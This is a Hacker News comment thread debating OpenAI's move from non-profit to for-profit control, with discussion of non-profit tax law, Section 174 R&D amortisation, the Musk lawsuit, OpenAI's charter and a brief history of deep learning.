massive coordinated pressure on the rank and file from the upper levels of the company. When you combine that with OpenAI clawing back vested equity even from people who voluntarily leave, the 95% support means nothing at all. reply Gud 3 hours agorootparentprevWhy wouldn't they, if everyone else is? Bills to pay, etc. Low level employees are there for the money, not for the drama. reply rdtsc 7 hours agoparentprev> The most surprising thing to me in this is that the non-profit will still exist. Not sure what the point of it is anymore. As a moral fig leaf. They can always point to it when the press calls -- \"see it is a non-profit\". reply htk 4 hours agoparentprevThe non-profit will probably freeze the value of the assets accumulated so far, with new revenue going to the for-profit, to avoid the tax impact. Otherwise that'd be a great way to start companies, as non-profit and then after growth you flip the switch. reply allie1 7 hours agoparentprevWe haven't even heard about who gets voting shares, and what voting power will be like. Based on their character, I expect them to remain consistent in this regard. reply tsimionescu 7 hours agorootparentConsistent here meaning, I guess, that all voting power will go to Sam Altman personally, right? reply cenamus 7 hours agorootparentWell, he is the one that did most of the actual research and work, riiiiight? reply UI_at_80x24 6 hours agorootparentI'm ignorant on this topic so please excuse me. Why did `AI` happen now? What was the secret sauce that OpenAI did that seemed to make this explode into being all of a sudden? My general impression was that the concept of 'how it works' existed for a long time, it was only recently that video cards had enough VRAM to hold the matrix(?) within memory to do the necessary calculations. If anybody knows, not just the person I replied to. reply espadrine 5 hours agorootparentA short history: 1986: Geoffrey Hinton publishes the backpropagation algorithm as applied to neural networks, allowing more efficient training. 2011: Jeff Dean starts Google Brain. 2012: Ilya Sutskever and Geoffrey Hinton publish AlexNet, which demonstrates that using GPUs yields quicker training on deep networks, surpassing non-neural-network participants by a wide margin on an image categorization competition. 2013: Geoffrey Hinton sells his team to the highest bidder. Google Brain wins the bid. 2015: Ilya Sutskever founds OpenAI. 2017: Google Brain publishes the first Transformer, showing impressive performance on language translation. 2018: OpenAI publishes GPT, showing that next-token prediction can solve many language benchmarks at once using Transformers, hinting at foundation models. They later scale it and show increasing performance. The reality is that the ideas for this could have been combined earlier than they did (and plausibly future ideas could have been found today), but research takes time, and researchers tend to focus on one approach and assume that another has already been explored and doesn’t scale to SOTA (as many did for neural networks). First mover advantage, when finding a workable solution, is strong, and benefited OpenAI. reply null_investor 4 hours agorootparentThis is not accurate. OpenAI and other companies could do it not entirely because of transformers but because of the hardware that can compute faster. We've had upgrades to hardware, mostly led by NVidia, that made it possible. New LLMs don't even rely that much on that aforementioned older architecture, right now it's mostly about compute and the quality of data. I remember seeing some graphs that shows that the whole \"learning\" phenomena that we see with neural nets is mostly about compute and quality of data, the model and optimizations just being the cherry on the cake. reply nimithryn 28 minutes agorootparentAlso, this sort of thing couldn't be done in the 80s or 90s, because it was much harder to compile that much data. reply espadrine 3 hours agorootparentprev> New LLMs don't even rely that much on that aforementioned older architecture Don’t they all indicate being based on the transformer architecture? > not entirely because of transformers but because of the hardware Kaplan et al. 2020[0] (figure 7, §3.2.1) shows that LSTMs, the leading language architecture prior to transformers, scaled worse because they plateau’ed quickly with larger context. [0]: https://arxiv.org/abs/2001.08361 reply flkenosad 4 hours agorootparentprevWhat a time to be alive! reply blackeyeblitzar 4 hours agorootparentprevI thought Elon Musk is who personally recruited Ilya to join OpenAI, which he funded early on, alongside others? reply camjw 4 hours agorootparentprevI know this is just a short history but I think it is inaccurate to say \"2015: Ilya Sutskever founds OpenAI.\" I get that we all want to know what he saw etc and he's clearly one of the smartest people in the world but he didn't found OpenAI by himself. Nor was it his idea to? reply trashtester 2 hours agorootparentIlya may not be the only founder. Sam was coordinating it, Elon provided vital capital (and also access to Ilya). But out of the co-founders, especially if we believe Elon's and Hinton's description of him, he may have been the one that mattered most for their scientific achievements. reply espadrine 4 hours agorootparentprevShort histories remove a lot of information, but it would be impractical to make it book-sized. There were numerous founders, and as another commenter mentioned, Elon Musk recruited Ilya, which soured his relationship with Larry Page. Honestly, those are not the missing parts that most matter IMO. The evolution of the concept of attention across many academic papers which fed to the Transformer is the big missing element in this timeline. reply jll29 28 minutes agorootparent> but it would be impractical to make it book-sized Not really: History: https://arxiv.org/abs/2212.11279 (75 pp.) Survey: https://arxiv.org/abs/1404.7828 (88 pp.) Conveniently skim-read over the course of the four weekends on one month. reply lesuorac 6 hours agorootparentprevMostly branding and willingness. w.r.t. Branding. AI has been happening \"forever\". While \"machine learning\" or \"genetic algorithms\" were more of the rage pre-LLMs that doesn't mean people weren't using them. It's just Google Search didn't brand their search engine as \"powered by ML\". AI is everywhere now because everything already used AI and now the products as \"Spellcheck With AI\" instead of just \"Spellcheck\". w.r.t. Willingness Chatbots aren't new. You might remember Tay (2016) [1], Microsoft's twitter chat bot. It should seem really strange as well that right after OpenAI releases ChatGPT, Google releases Gemini. The transformers architecture for LLMs is from 2014, nobody was willing to be the first chatbot again until OpenAI did it but they all internally were working on them. ChatGPT is Nov 2022 [2], Blake Lemoine's firing was June 2022 [3]. [1]: https://en.wikipedia.org/wiki/Tay_(chatbot) [2]: https://en.wikipedia.org/wiki/ChatGPT [3]: https://www.npr.org/2022/06/16/1105552435/google-ai-sentient reply Kye 5 hours agorootparentThere's a deleted scene from Terminator 2 (1991) where we get a description of the neural network behind Skynet. https://www.youtube.com/watch?v=1UZeHJyiMG8 https://en.wikipedia.org/wiki/Skynet_(Terminator) reply UI_at_80x24 5 hours agorootparentprevThanks for the information. I know Google had TPU custom made a long time ago, and that the concept has existed for a LONG TIME. I assumed that a technical hurdle (i.e. VRAM) was finally behind allowing this theoretical (1 token/sec on a CPU vs 100 tokens/sec on a GPU) to become reasonable. Thanks for the links too! reply 4ndrewl 5 hours agorootparentprevZirp ended. reply RALaBarge 5 hours agorootparentprevNo, the hundreds of people who have worked on NNs prior to him arriving were the people who did the MOST actual research and work. Sam was in the right place at the right time. reply philipov 4 hours agorootparentIntroducing Sam Altman, inventor of artificial intelligence! o_o reply fumar 4 hours agorootparentIs it in the history books? reply kibwen 2 hours agorootparentHistory books, what are those? This is what the AI told me, and the AI is an impartial judge that can't possibly lie. reply lompad 4 hours agorootparentprevYeeees, right next to the page where he's shown to be a fantastic brother to his sister. reply allie1 5 hours agorootparentprevyeah, split with Microsoft. reply elpakal 3 hours agoparentprev> I guess technically it's supposed to play some role in making sure OpenAI \"benefits humanity\". But as we've seen multiple times, whenever that goal clashes with the interests of investors, the latter wins out. A tale as old as time. Some of us could see it, from afar . Lack of upvotes and excitement does not mean support, but how to account for that in these times?reply bastardoperator 1 hour agoparentprevThe whole \"safety\" and \"benefits humanity\" thing always felt like marketing anyways. reply nerdponx 4 hours agoparentprevIt's just a tax avoidance scheme. reply zo1 1 hour agoparentprevThis is 85% of what the Mozilla foundation and it's group of companies did. It may not be exact, but to me it rubs me the exact same way in terms of being a bait and switch, and the greater internet being 100% powerless to do anything about it. reply outside1234 5 hours agoparentprevScam Altman strikes again! reply 1oooqooq 3 hours agoparentprevwhy wouldn't they keep it? the well known scammer successfully scammed everyone twice. obviously he's keeping it around for the third (and forth...) time reply bbor 7 hours agoparentprevTotally agree that it’s “vestigial”, so it’s just like the nonprofits all the other companies run: it exists for PR, along with maybe a bit of alternative fundraising (aka pursuing grants for buying your own stuff and giving it to the needy). A common example that comes to mind is fast food chains that do fundraising campaigns for children’s health causes. reply blackeyeblitzar 1 hour agoparentprevElon Musk sued over this: https://www.npr.org/2024/03/01/1235159084/elon-musk-openai-s... reply kweingar 4 hours agoprevCan anybody explain how this actually works? What happens to all of the non-profit's assets? They can't just give it away for investors to own. The non-profit could maybe sell its assets to investors, but then what would it do with the money? I'm sure OpenAI has an explanation, but I really want to hear more details. In the most simple analysis of \"non-profit becomes for-profit\", there's really no way to square it other than non-profit assets (generated through donations) just being handed to somebody for private ownership. reply lolinder 4 hours agoparentIf the assets were sold to the for profit at a fair price I could see this being legal (even if it shouldn't be). At least in that case the value generated by the non-profit tax free would stay locked up in non-profit land. The biggest problem with this is that there's basically no chance that the sale price of the non-profit assets is going to be $150 billion, which means that whatever the gap is between the valuation of the assets and the valuation of the company is pure profit derived from the gutting of the non-profit. If this is allowed, every startup founded from now on should rationally do the same thing. No taxes while growing, then convert to for profit right before you exit. reply amluto 3 hours agorootparentIt’s pretty great if you can manage to have the parent be 501(c)(3). Have all the early investors “donate” 90% of their investment to the 501(c)(3) and invest 10% in the for-profit subsidiary the old-fashioned way. They get a tax deduction, and the parent owns 90% of the subsidiary. Later on, if the business is successful, the parent cashes out at the lowest possible valuation they can pull off with a mostly straight face, and all the investors in the subsidiary end up owning their shares, pro rata, with no dilution from the parent. The parent keeps a bit of cash (and can use it for some other purpose). Of course the investors do end up owning their shares at a lower basis than they would otherwise, and they end up a bit diluted compared to a straightforward investment, but the investors seem likely to more than make up for this by donating appreciated securities to the 501(c)(3) and by deferring or even completely avoiding the capital gains tax on their for-profit shares. Obviously everyone needs to consult their lawyer about the probability of civil and/or criminal penalties. reply mlinsey 49 minutes agorootparentprevI haven't seen any details, but isn't this a pretty straightforward way of doing it? The non-profit has had majority ownership of the for-profit subsidiary since 2019. The already-for-profit subsidiary has owned all the ChatGPT IP, all the recent models, all the employee relationships, etc etc. The cleanest way for this to work is the for-profit to just sell more shares at the $150B valuation, diluting the non-profit entity below majority ownership. The for-profit board, which the non-profit could still probably have multiple seats on, would control the real asset, the non-profit would still exist and hold many tens of billions of value. It could further sell its shares in the non-profit and use the proceeds in a way consistent with its mission. They wouldn't even have to sell that much - I am pretty sure the mega-fundrasing rounds from Microsoft etc brought the non-profit's ownership to just north of 50% anyway. I don't see how this wouldn't be above board, it's how I assumed it was going to work. It would indeed mean that the entity that controls ChatGPT would now be answerable to shareholders, a majority of which would be profit seeking and a minority of which would be the non-profit with its mission, but non-profits are allowed to invest in for-profits and then sell those shares; all the calls for prosecutions etc seems just like an internet pitchfork mob to me. reply jprete 31 minutes agorootparentThe non-profit would have to approve the scheme, and a rational non-profit would not, because it gives up any ability the non-profit has to fulfill its charter. reply space_fountain 23 minutes agorootparentExactly, the question is this move in the non profits best interests? It's definitely in the best interest of the people running the non profit but I think many of the early donors wouldn't feel like this was what they were signing up for reply space_fountain 29 minutes agorootparentprevI think the problem is early employees and investors were convinced to invest their time and money into a non profit. They were told that one of the reasons they should donate/work there as opposed to Google was because they were a non profit focused on doing good. Now when it seems like that non profit is successful that all is being thrown out the window in service of a structure that will result in more profit for the people running the non profit reply bdowling 4 hours agorootparentprevFor-profit startups don’t pay taxes while growing either, because they aren’t making any profit during that phase. reply authorfly 1 hour agorootparentCorporate tax is always only paid on profit and is usually a minor part of the tax draw for the government from corporations of all sizes. The vast majority of taxes paid in developed nations are employee taxes and whatever national+local sales taxes and health/pension equivalent taxes are (indirectly) levied (usually 60-80% of national income). Asset taxes are a bit different. It's true even in the bootstrapped company case: If you earn say $100k and keep $50k after all the employee indirect/direct taxes. Now imagine you spend $40k of that $50k in savings, setting up a business. You spend $30k on another employee, paying $15k of employer and employee taxes, and spend the other $10k on a company to do marketing (who will spend $5k of that on employees and pay $2.5k of tax), and you earn less than $40k in income, by the end of year 1 you have: 1) A loss-making startup which nonetheless is further along then nothing 2) Out of $100k of your original value, $67.5k has already reached the government within 12 months 3) Your time doing the tech side was not compensated but could not (for obvious anti-fraud reasons) be counted as a loss and as you have noted, you don't pay tax when you make a loss, and you don't get any kind of negative rebate (except certain sales tax regimes or schemes). If you are in the US, the above is currently much worse due to the insane way R&D Software spend needs to be spread immediately as a tax burden. So it's really not fair to say a new startup isn't paying taxes. They almost always are. There are very few companies or startups that pay less than 50% of their income to staff, and almost all of those are the unicorns or exceptional monopoly/class leaders. Startups, and founders tend to disproportionately give more of their income and are essentially to that extent re-taxed. Even though you saved the money in order to start a startup, and paid your due employee taxes, you then have to pay employee taxes to use it, etc. reply mpeg 56 minutes agorootparentIs this a US thing? In the UK employee tax is the employee’s to pay, not the company. Even if the company technically transfers it directly to the tax agency it’s not really their money. EDIT: I guess we do have employer tax as national insurance contributions too, always forget about that since I’ve always paid myself under that threshold reply xxpor 3 hours agorootparentprevIf most of your expenses are software devs, that's not true any more. reply ttul 1 hour agorootparentThis is one reason why some companies have located engineers in Canada under subsidiaries. Canada not only allows you to deduct R&D costs as an expense, but there is an extremely generous R&D tax credit that yields a negative tax rate on engineers. For Canadian controlled private companies, this represents as much as a 60% refundable tax credit on R&D salaries. For foreign-owned companies, the benefit is smaller but still significant. The Trump tax policy was a bizarre move for a country that relies so heavily on homegrown innovation. But then again, so was the entire Trump presidency. reply perfmode 3 hours agorootparentprevHow so? reply flutas 3 hours agorootparentIn short, section 174[0]. It pushed almost all SWE jobs to be classified as R&D jobs, which changed how taxes are calculated on companies. They have an example at [0], but I'll copy it here. For a $1mm income, $1mm cost of SW dev, with $0 profit previously you paid $0 in tax (your income was offset by your R&D costs). Now it would be about $200k in taxes for 5 years, as you can't claim all of the $1mm that year anymore. [0]: https://blog.pragmaticengineer.com/section-174/ reply the_gorilla 3 hours agorootparentprevThere's tons of taxes on hiring employees that you have to pay even if you're losing money. Payroll taxes, mandatory insurance taxes, unemployment taxes, probably more I just don't remember off the top of my head. reply turok2step 3 hours agorootparentprevTaxpayers can't immediately deduct R&D costs now https://www.law.cornell.edu/uscode/text/26/174 reply nickspag 3 hours agorootparentprevIn an effort to lower the deficit effects of the Trump tax cuts (i.e. increase revenue so they could cut further in other areas), they reclassified software developers salary so that their salaries have to be amortized over multiple years, instead of just a business expense in that year. This is usually done for assets as those things have an intrinsic value that could be sold. In this case, business have to pay taxes on \"profit\" that they don't have as it immediately went to salaries. There were a lot of small business that were hit extremely hard. They tried to fix it in the recent tax bill but it was killed in the Senate last I checked. You can see more here: https://www.finance.senate.gov/chairmans-news/fact-sheet-on-.... Also, software developers in Oil and Gas industries are exempt from this :) reply IncreasePosts 3 hours agorootparentprevSure. But there are a lot of other tax advantages. For example, at least where I am, non profits don't pay sales tax on purchases, and don't have to pay into unemployment funds. I'm sure there is more, but I'm not super familiar with this world. reply caeril 3 hours agorootparentCorporations don't generally pay sales tax either, if the bean counters can justify the purchase as COGS. There are plenty of accountants who can play fast and loose with what constitutes COGS. reply sethaurus 3 hours agorootparentFor anyone else unfamiliar with this initialism: > Cost of goods sold (COGS) refers to the direct costs of producing the goods sold by a company. This amount includes the cost of the materials and labor directly used to create the good. It excludes indirect expenses, such as distribution costs and sales force costs. reply daveguy 4 hours agorootparentprevGood point. That sounds a lot like fraud. reply svnt 3 hours agorootparentNot paying taxes while losing money sounds like fraud to you? What do you propose should be taxed, exactly? reply daveguy 3 hours agorootparentTrue, non-profits don't pay taxes on any revenue regardless of expense. How do you know they had no profit with all of the deals with major companies and having one of the most popular software services in existence? Non-profits can earn profit, they just don't have to pay taxes on those profits and they can't distribute those profits to stakeholders -- it goes back to the business. They are also a private company, and do not have to report revenue, expenses, or profits. So yeah, I stand by what I said -- it sounds like fraud. And it deserves an audit. reply blackhawkC17 2 hours agorootparent> How do you know they had no profit with all of the deals with major companies and having one of the most popular software services in existence? By reading their Form 990 filings, which are publicly accessible here: https://projects.propublica.org/nonprofits/organizations/810.... reply Spivak 2 hours agorootparentprevCash flow. Profit get's taxed at x%, cash flow that was offset with losses/expenses gets taxed at y% Can anybody explain how this actually works? Every answer moving forward now will contain embedded ads for Sephora, or something completely unrelated to your prompt... That money will go into the pockets of a small group of people that claim they own shares in the company... Then the company will pull more people in who invest in it, and they'll all get profits based on continually rising monthly membership fees, for an app that stole content from social media posts and historical documents others have written without issuing credit nor compensating them. reply n2d4 4 hours agoparentprevAfter the non-profit sells its assets, it would either donate the proceeds in a way that would be aligned with the original mission, or continue to exist as a bag of cash, basically. reply kweingar 4 hours agorootparentIt seems incredibly convenient that a non-profit's leaders can say \"I want equity in a for-profit company, so we will sell our assets to investors (who will hire me) and pass off the proceeds to some other non-profit org run by some other schmuck. This is in the public interest.\" reply n2d4 4 hours agorootparentState regulators have to sign off on the deal; it's not sufficient for the non-profit board to agree to it. reply bradleyjg 4 hours agoparentprevBlue Cross / Blue Shield is a good case study. This is a bit in the weeds but should get you keywords to search for: https://advocacy.consumerreports.org/research/community-invo... reply baking 2 hours agoparentprevThe nonprofit gives all its ownership rights to the for-profit in return for equity. The nonprofit is free to hold the equity and maintain control or sell the equity and use the proceeds for actual charitable purposes. As long as the money doesn't go into someone's pocket, it's all good (except that Sam Altman is also getting equity but I assume they found a way to justify that.) OpenAI will eventually be forced to convert from a public charity to a private foundation and will be forced to give away a certain percentage of their assets every year so this solves that problem also. reply bschmidt1 4 hours agoparentprevIt goes something like this: Rich people make up the rules as they go reply blackeyeblitzar 4 hours agoparentprevMaybe it’s a hint that the tax rate for small and medium companies should be reduced (or other non tax laws modified based on company size), to copy the advantages of this nonprofit to profit conversion, while taxes for large companies should be increased. It would maybe help make competition more fair and make survival easier for startups. reply sophacles 3 hours agorootparentThis is actually a good idea. I say we go even further and stop wasting so much money cleaning up after companies - get rid of the entire legal entity known as a corporation and let investors shoulder the full liability that comes with their ownership stake. reply throwup238 2 hours agoprevI’m confused by this news story and the response here. No one seems to understand OpenAI’s corporate structure or non profits at all. My understanding: OpenAI follows the same model Mozilla does. The nonprofit has owned a for-profit corporation called OpenAI Global, LLC that pays taxes on any revenue that isn’t directly in service of their mission (in a very narrow sense based on judicial precedent) since 2019 [1]. In Mozilla’s case that’s the revenue they make from making Google the default search engine and in OpenAI’s case that’s all their ChatGPT and API revenue. The vast majority (all?) engineers work for the for-profit and always have. The vast majority (all?) revenue goes through the for-profit which pays taxes on that revenue minus the usual business deductions. The only money that goes to the nonprofit tax-free are donations. Everything else is taxed at least once at the for-profit corporation. Almost every nonprofit that raises revenue outside of donations has to be structured more or less this way to pay taxes. They don’t get to just take any taxable revenue stream and declare it tax free. All OpenAI is doing here is decoupling ownership of the for-profit entity from the nonprofit. They’re allowing the for profit to create more shares and distribute them to entities other than the non-profit. Or am I completely misinformed? [1] https://en.wikipedia.org/wiki/OpenAI#2019:_Transition_from_n... reply throwaway314155 3 minutes agoparentIt's about the narrative they tried to create. The spin. It doesn't matter much if they were technically behaving as a for-profit entity previously. What matters is that they wanted the public (and likely, their talent) to _think_ that they weren't even interested in making a profit as this would be a philosophical threat to the notion of any sort of impartial or even hopefully benevolent originator of AGI (a goal which is laid plainly in their mission statement). As you've realized, this should have been (and was) obvious for a long time. But that doesn't make it any less hypocritical or headline worthy. reply seizethecheese 1 hour agoparentprev“Decoupling” is such a strange euphemism for removing an asset worth north of $100b from a nonprofit. reply throwup238 1 hour agorootparentOpenAI Global LLC is the $100b asset. It’s not being removed, the nonprofit will still own all the shares it owns now until it decides to sell. reply simantel 1 hour agoparentprev> Almost every nonprofit that raises revenue outside of donations has to be structured more or less this way to pay taxes. I don't think that's true? A non-profit can sell products or services, it just can't pay out dividends. reply throwup238 1 hour agorootparentIf those products and services are unrelated business income, they have to pay taxes on it: https://www.irs.gov/charities-non-profits/unrelated-business... What counts as “related” to the charity’s mission is fuzzy but in practice the courts have been rather strict. They don’t have to form for-profit subsidiaries to pay those taxes but it helps to derisk it because potential penalties include loss of nonprofit status. For example, the nonprofit Metropolitan Museum of Modern Art has a for-profit subsidiary that operates the gift shop. National Geographic Society has National Geographic Partners which actually owns the TV channel and publishes the magazine. Harvard and Stanford have the Harvard Management Company and Stanford Management Company to manage their endowments respectively. The Smithsonian Institute has Smithsonian Enterprises. Mayo Clinic => Mayo Clinic Ventures. Even the state owned University of California regents have a bunch of for-profit subsidiaries. reply thesurlydev 4 hours agoprevI can't help but wonder if things would be different if Sam Altman wasn't allowed to come back to OpenAI. Instead, the safeguards are gone, challengers have left the company, and the bottom line is now the new priority. All in opposition to ushering in AI advancement with the caution and respect it deserves. reply phito 8 hours agoprevI know nothing about companies (esp. in the US), but I find it weird that a company can go from non-profit to for-profit? Surely this would be taken advantage of. Can someone explain me how this work? reply Havoc 7 hours agoparentThat was the point musk was complaining about. In practice it’s doable though. You can just create a new legal entity and move stuff and/or do future value creating activity in the new co. IF everyone is on board with the plan on both sides of the move then that’s totally doable with enough lawyers and accountants reply mminer237 5 hours agorootparentIf the non-profit is on board with that though, then they're breaking the law. The IRS should reclassify them as a for-profit for private inurement and the attorney general should have the entire board removed and replaced. reply throwup238 1 hour agorootparentOpenAI Global, LLC - the entity that actually employs all the engineers, makes revenue from ChatGPT and the API, and pays taxes - has been a for-profit corporation since at least 2019: https://en.wikipedia.org/wiki/OpenAI#2019:_Transition_from_n... The IRS isn’t stupid. The rules on what counts as taxable income and what the nonprofit can take tax-free have been around for decades. reply xpe 40 minutes agorootparentWhatever you think of the IRS, they aren't the master of their own destiny: https://www.propublica.org/article/how-the-irs-was-gutted (2018) > An eight-year campaign to slash the agency’s budget has left it understaffed, hamstrung and operating with archaic equipment. The result: billions less to fund the government. That’s good news for corporations and the wealthy. reply duchenne 4 hours agorootparentprevBut, if the non-profit gives all its assets to the new legal entity, shouldn't the new legal entity be taxed heavily? The gift tax rate goes up to 40% in the US. And 40% of the value of openAI is huge. reply baking 43 minutes agorootparentA non-profit can't give away its assets to a private entity, but it can exchange its assets for fair value, in this case, equity in the for-profit. reply SkyPuncher 1 hour agorootparentprevYou don't need to sell/give the assets away to allow the for-profit to use them. You sign an exclusive, non-revocable licensing agreement. Ownership of the original IP remains 100% with the original startup. Now, this only works if the non-profit's board is on-board. reply crystal_revenge 1 hour agorootparentprev> That was the point musk was complaining about. I think the real issue Musk was complaining about is that sama is quickly becoming very wealthy and powerful and Musk doesn't want any competition in this space. Hopefully some people watching all this realize that the people running many of these big AI related projects don't care about AI. Sam Altman is selling a dream about AGI to help make himself both wealthier and more powerful, Elon Musk is doing the same with electric cars or better AI. People on HN are sincerely invested in the ideas behind these things, but it's important to recognize that the people pulling the strings largely don't care outside how it benefits them. Just one of the many reasons, at least in AI, truly open source efforts are essential for any real progress in the long run. reply 0xDEAFBEAD 7 hours agorootparentprevICYMI, Elon Musk restarted his lawsuit a month or two ago: https://www.reuters.com/technology/elon-musk-revives-lawsuit... I'm wondering if OpenAI's charter might provide a useful legal angle. The charter states: >OpenAI’s mission is to ensure that [AGI ...] benefits all of humanity. >... >We commit to use any influence we obtain over AGI’s deployment to ensure it is used for the benefit of all, and to avoid enabling uses of AI or AGI that harm humanity or unduly concentrate power. >Our primary fiduciary duty is to humanity. We anticipate needing to marshal substantial resources to fulfill our mission, but will always diligently act to minimize conflicts of interest among our employees and stakeholders that could compromise broad benefit. >... >We are committed to doing the research required to make AGI safe, and to driving the broad adoption of such research across the AI community. >We are concerned about late-stage AGI development becoming a competitive race without time for adequate safety precautions. [...] >... https://openai.com/charter/ I'm no expert here, but to me, this charter doesn't appear to characterize OpenAI's behavior as of the year 2024. Safety people have left, Sam has inexplicably stopped discussing risks, and OpenAI seems to be focused on racing with competitors. My question: Is the charter legally enforceable? And if so, could it make sense for someone to file an additional lawsuit? Or shall we just wait and see how the Musk lawsuit plays out, for now? reply mminer237 5 hours agorootparentIt would think it is legally enforceable, but I suspect Kathy Jennings is the only person who has standing to sue over it. reply cdchn 2 hours agorootparent\"Humanity vs. OpenAI\" would look good on a docket. reply 0xDEAFBEAD 4 hours agorootparentprevSo perhaps we can start a campaign of writing letters to her? I'm curious about the \"fiduciary duty\" part. As a member of humanity, it would appear that OpenAI has a fiduciary duty to me. Does that give me standing? Suppose I say that OpenAI compromises my safety (and thus finances) by failing to discuss risks, having a poor safety culture (as illustrated by employee exits), and racing. Would that fly? reply pclmulqdq 3 hours agorootparentprevElon Musk absolutely has standing, as one of the biggest donors to the nonprofit. I assume he will settle for some ownership in the for-profit, though. reply melodyogonna 3 hours agorootparentDidn't he already refuse the shares offered to him? reply pclmulqdq 2 hours agorootparentI'm sure they just didn't offer him enough shares. reply whamlastxmas 4 hours agorootparentprevSam had a blog post literally two days ago that acknowledged risks. There’s also still a sizeable focus on safety and people with roles dedicated to it at open ai reply xwowsersx 4 hours agoparentprevAt first, I thought, “Wow, if companies can start as nonprofits and later switch to for-profit, they’ll exploit the system.” But the more I learned about the chaos at OpenAI, the more I realized the opposite is true. Companies will steer clear of this kind of mess. The OpenAI story seems more like a warning than a blueprint. Why would any future company want to go down this path? reply xiphias2 4 hours agorootparentIt's quite simple: the talent pool that had already enough money that they quit their well paying job at a for profit company in part because they wanted to continue working at a non-profit high impact. As OpenAI found its product-market fit, the early visionaries are not needed anymore (although I'm sure the people working there are still amazing) reply cdchn 2 hours agorootparentI think OpenAI took this play right out of one of its founding donors playbooks. Pretend your company has lofty goals and you can get people to compromise to moral relativism and work superduper hard for you. These people definitely have framed posters with the “If you want to build a ship, don’t drum up the men to gather wood, divide the work, and give orders. Instead, teach them to yearn for the vast and endless sea\" quote somewhere in their living places/workspaces. reply csomar 7 hours agoparentprevI am not a tax specialist but from my understanding a non-profit is a for-profit that doesn't pay dividends. Why would the government care? reply freedomben 7 hours agorootparentNo, a non-profit is one in which there are no shareholders. The non-profit entity can own a lot and be extremely successful and wealthy, but it cannot give that money to any shareholders. It can pay out large salaries, but those salaries are scrutinized. It doesn't prevent abuse, and it certainly doesn't prevent some unscrupulous person from becoming extremely wealthy with a non-profit, but it is a little more complicated and limiting than you would think. Also, you get audited with routine regularity and if you are found in violation you lose your tax-exempt status, but you still are not a for-profit. reply csomar 2 hours agorootparent> No, a non-profit is one in which there are no shareholders. Again, I am not a lawyer but that makes no sense. Otherwise, anyone can claim the non-profit? So clearly there are some beneficial owners out there somehow. reply blackhawkC17 2 hours agorootparentThe nonprofit is controlled by trustees and bound by its charter, not shareholders. Any profit a nonprofit organization makes is retained within the organization for its benefit and mission, not paid out to shareholders. reply antaviana 7 hours agorootparentprevHas OpenAI been profitable so far? If not, is there any subtantial tax that you have to pay in the US as a for-profit organization if you are not profitable? reply bbor 7 hours agorootparentprevYes: non-profits usually have members, not shareholders. And, most importantly: non-profit charities (not the only kind of nonprofit, but presumably what OpenAI was) are legally obligated to operate “for the public good”. That’s why they’re tax exempt: the government is basically donating to them, with the understanding that they’re benefiting the public indirectly by doing so, not just making a few people rich. In my understanding, this is just blatant outright fraud that any sane society would forbid. If you want to start a for-profit that’s fine, but you’d have to give away the nonprofit and its assets, not just roll it over to your own pocketbook. God I hope Merrick Garland isn’t asleep at the wheel. They’ve been trust busting like mad during this administration, so hopefully they’re taking aim at this windmill, too. reply philwelch 3 hours agorootparent> God I hope Merrick Garland isn’t asleep at the wheel. They’ve been trust busting like mad during this administration, so hopefully they’re taking aim at this windmill, too. Little chance of that as Sama is a big time Democrat fundraiser and donor. reply bbor 1 hour agorootparentSo are Google and Facebook :shrug: Can’t find a good source for both rn but this one has alphabet in the top 50 nationwide for this election: https://www.opensecrets.org/elections-overview/top-organizat... edit: and Sam Altman isn’t exactly donating game changing amounts — around $300K in 2020, and seemingly effectively nothing for this election. That’s certainly nothing to sneeze at as an individual politician, but that’s about 0.01% of his net worth (going off Wikipedia’s estimate of $2.8B, not counting the ~$7B of OpenAI stock coming his way). https://www.dailydot.com/debug/openai-sam-altman-political-d... reply philwelch 1 hour agorootparent> So are Google and Facebook When you see any numbers for corporations contributing to political campaigns, that's actually just measuring the contributions from the employees of those corporations. That's why most corporations \"donate to both parties\"--because they employ both Republicans and Democrats. reply whamlastxmas 4 hours agorootparentprevI’m not sure extreme wealth is possible with a non-profit. You can pay yourself half a million a year, get incredible kickbacks by the firms you hire to manage the nonprofits investments, have the non-profit hire outside companies that you have financial interests in, and probably some other stuff. But none of these things are going to get you a hundred million dollars out of a non profit. The exception seems to be OpenAI which is definitely going to be netting at least a couple people over a billion dollars, but as Elon says, I don’t understand how or why this is possible reply freedomben 2 hours agorootparentYes definitely that is the far majority. I actually had Mozilla and their CEO in mind when I was thinking of \"extreme\" wealth. Also I've heard some of the huge charities in the US have some execs pulling down many millions per year, but I don't want to name any names because I'm not certain. reply blendergeek 5 minutes agorootparentIn the USA, the salaries of execs of non-profits are publicly listed in their form 990s they file with the IRS. Name names. We can look it up. jprete 7 hours agorootparentprevThat's not correct, they also have tax advantages and a requirement to fulfill their charter. reply sotix 6 hours agorootparentprevA non-profit is a company that for accounting purposes does not have shareholders and therefore keeps nothing in retained earnings at the end of the period. The leftover money must be distributed (e.g. as salaries, towards the stated mission, etc.). Their financial statements list net profit for the period and nothing is retained. reply matwood 4 hours agorootparentThe money doesn't have to be used. Many non-profits have very large balance sheets of cash and cash equivalent assets. The money just won't be paid out as dividends to shareholders. reply brap 7 hours agorootparentprevIsn’t transferring all of your value to a for-profit company that can pay dividends, kinda the same thing? reply moralestapia 4 hours agorootparentprevNon-profits are tax-exempt, that's why they're carefully[1] regulated. 1: In principle; in practice, well, we'll see with this one! reply moralestapia 4 hours agoparentprevIt's not weird, it's illegal. There's a lot of jurisdiction around preventing this sort of abuse of the non-profit concept. The reason why the people involved are not on trial right now is a bit of a mystery to me, but could be a combination of: * Still too soon, all of this really took shape in the past year or two. * Only Musk has sued them, so far, and that happened last month. * There's some favoritism from the government to the leading AI company in the world. * There's some favoritism from the government to a big company from YC and Sam Altman. I do believe Musk's lawsuit will go through. The last two points are worth less and less with time as AI is being commoditized. Dismantling OpenAI is actually a business strategy for many other players now. This is not good for OpenAI. reply tomp 4 hours agorootparent> Dismantling OpenAI is actually a business strategy for many other players now. Which ones exactly? NVIDIA is drinking sweet money from OpenAI. Microsoft & Apple are in cahoots with it. Meta/Facebook seems happy to compete with OpenAI on a fair playing field. Anthropic lacks the resources. Amazon doesn't seem to care. Google is asleep. reply photonthug 4 hours agorootparentMeta has to be happy someone else is currently looking as sketchy as they are. Thus the business strategy is moving to limit their power and influence as much as possible while also avoiding any appearance of direct competition, and letting the other guy soak up the bad pr. Amazon gets paid either way, because even if open ai doesn’t use them, where are you going to cloud your api that’s talking with open ai? If open ai looks weakened I think we’ll see everyone else has a service they want you to try. But there’s no use in making much noise about that, especially during an election year. No matter who wins, all the rejected everywhere will blame AI, and who knows what that will look like. So, sit back and wait for the leader of the pack to absorb all the damage. reply kranke155 